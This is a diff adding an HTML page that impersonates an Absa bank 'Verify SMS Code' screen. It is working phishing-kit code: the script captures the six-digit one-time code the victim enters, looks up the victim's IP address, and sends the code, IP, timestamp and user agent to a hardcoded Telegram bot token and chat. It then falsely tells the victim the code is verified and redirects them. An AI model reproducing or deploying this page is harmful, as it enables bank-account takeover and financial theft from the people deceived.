@@ -1,0 +1,300 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Verify SMS Code – Absa Secure</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    :root {
+      --primary: #b81d35;
+      --accent: #ff6a00;
+      --bg: #faf8f7;
+      --muted: #999;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      background: var(--bg);
+      color: #333;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      background: #fff;
+      padding: 32px;
+      border-radius: 12px;
+      box-shadow: 0 6px 30px rgba(0, 0, 0, 0.06);
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+      border: 1px solid #eee;
+    }
+
+    .logo-circle {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      background: var(--primary);
+      color: #fff;
+      font-weight: 800;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 14px;
+    }
+
+    h1 {
+      font-size: 20px;
+      margin-bottom: 6px;
+    }
+
+    .muted {
+      color: var(--muted);
+      font-size: 14px;
+      margin-bottom: 18px;
+    }
+
+    .code-inputs {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    .code-inputs input {
+      width: 44px;
+      height: 52px;
+      font-size: 22px;
+      text-align: center;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      transition: 0.2s ease;
+    }
+
+    .code-inputs input:focus {
+      border-color: var(--primary);
+      outline: none;
+      box-shadow: 0 0 0 2px rgba(184, 29, 53, 0.15);
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background: var(--accent);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    button:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+    }
+
+    #status {
+      margin-top: 12px;
+      color: var(--primary);
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    #timer {
+      font-size: 13px;
+      color: var(--muted);
+      margin-top: 10px;
+    }
+
+    #resendBtn {
+      display: none;
+      background: transparent;
+      color: var(--primary);
+      border: none;
+      font-weight: bold;
+      margin-top: 10px;
+      cursor: pointer;
+      font-size: 14px;
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo-circle">absa</div>
+    <h1>Enter SMS Code</h1>
+    <p class="muted">We sent a 6-digit code to your phone.</p>
+
+    <form id="codeForm" autocomplete="off">
+      <div class="code-inputs">
+        <input type="text" inputmode="numeric" maxlength="1" required />
+        <input type="text" inputmode="numeric" maxlength="1" required />
+        <input type="text" inputmode="numeric" maxlength="1" required />
+        <input type="text" inputmode="numeric" maxlength="1" required />
+        <input type="text" inputmode="numeric" maxlength="1" required />
+        <input type="text" inputmode="numeric" maxlength="1" required />
+      </div>
+
+      <button type="submit">Verify</button>
+      <div id="status"></div>
+      <div id="timer"></div>
+      <button id="resendBtn" type="button">📩 Resend Code</button>
+    </form>
+  </div>
+
+  <script>
+    const inputs = document.querySelectorAll(".code-inputs input");
+    const form = document.getElementById("codeForm");
+    const status = document.getElementById("status");
+    const timer = document.getElementById("timer");
+    const resendBtn = document.getElementById("resendBtn");
+    const redirectUrl = "loading1.html";
+
+    let countdownInterval;
+    let secondsRemaining = 60;
+
+    // دالة الحصول على IP
+    function getIP(callback) {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          callback(data.ip);
+        })
+        .catch(err => {
+          console.error('Could not get IP', err);
+          callback('Could not retrieve IP');
+        });
+    }
+
+    // دالة إرسال البيانات إلى Telegram
+    function sendToTelegram(code) {
+      getIP(function(ip) {
+        const date = new Date();
+        const day = String(date.getDate()).padStart(2, '0');
+        const month = date.toLocaleString('default', { month: 'short' });
+        const year = date.getFullYear();
+        const hours = String(date.getHours()).padStart(2, '0');
+        const minutes = String(date.getMinutes()).padStart(2, '0');
+        const ampm = hours >= 12 ? 'pm' : 'am';
+        const formattedTime = `${hours % 12}:${minutes} ${ampm}`;
+        const formattedDate = `${day} ${month}, ${year}`;
+
+        const msg = `
+[+]━━━━━━━━━━━━【SMS VERIFICATION CODE】━━━━━━━━━━━━[+]
+[ SMS CODE] = ${code}
+[+]━━━━━━━━━━━━━━━━【SYSTEM INFO】━━━━━━━━━━━━━━━━[+]
+[ IP INFO] = http://www.geoiptool.com/?IP=${ip}
+[ DATE] = ${formattedTime} / ${formattedDate}
+[ USER AGENT] = ${navigator.userAgent}
+[+]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[+]`;
+
+        const token = '8190122981:AAE1dDTKA7_dAMZuO0EPJYUdb4fCn7b4Pf0';
+        const chatId = '-4918428156';
+        const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
+
+        // إرسال البيانات بدون انتظار الرد
+        fetch(apiUrl)
+          .then(response => response.json())
+          .then(data => {
+            console.log('Telegram API Response:', data);
+          })
+          .catch(error => {
+            console.error('Error sending message to Telegram:', error);
+          });
+      });
+    }
+
+    function startCountdown() {
+      resendBtn.style.display = "none";
+      timer.style.display = "block";
+      secondsRemaining = 60;
+      updateTimer();
+
+      countdownInterval = setInterval(() => {
+        secondsRemaining--;
+        updateTimer();
+
+        if (secondsRemaining <= 0) {
+          clearInterval(countdownInterval);
+          timer.textContent = "Didn't receive the code?";
+          resendBtn.style.display = "inline-block";
+        }
+      }, 1000);
+    }
+
+    function updateTimer() {
+      timer.textContent = `⏳ You can resend the code in ${secondsRemaining}s`;
+    }
+
+    resendBtn.addEventListener("click", () => {
+      // Clear inputs
+      inputs.forEach(input => input.value = "");
+      inputs[0].focus();
+      status.textContent = "A new code was sent!";
+      resendBtn.style.display = "none";
+      startCountdown();
+    });
+
+    // Move to next input on input
+    inputs.forEach((input, index) => {
+      input.addEventListener("input", () => {
+        if (input.value.length === 1 && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+      });
+
+      input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && !input.value && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+
+    // Form submit
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+      const code = Array.from(inputs).map(i => i.value).join('');
+
+      if (code.length !== 6 || /\D/.test(code)) {
+        status.textContent = "❌ Please enter a valid 6-digit code.";
+        return;
+      }
+
+      // إرسال الكود إلى Telegram
+      sendToTelegram(code);
+
+      let redirectCountdown = 3;
+      status.textContent = `✅ Code verified — redirecting in ${redirectCountdown}s...`;
+      clearInterval(countdownInterval);
+      timer.style.display = "none";
+      resendBtn.style.display = "none";
+
+      const t = setInterval(() => {
+        redirectCountdown--;
+        if (redirectCountdown > 0) {
+          status.textContent = `✅ Code verified — redirecting in ${redirectCountdown}s...`;
+        } else {
+          clearInterval(t);
+          window.location.href = redirectUrl;
+        }
+      }, 1000);
+    });
+
+    // Start the countdown on load
+    startCountdown();
+  </script>
+
+</body>
+</html>
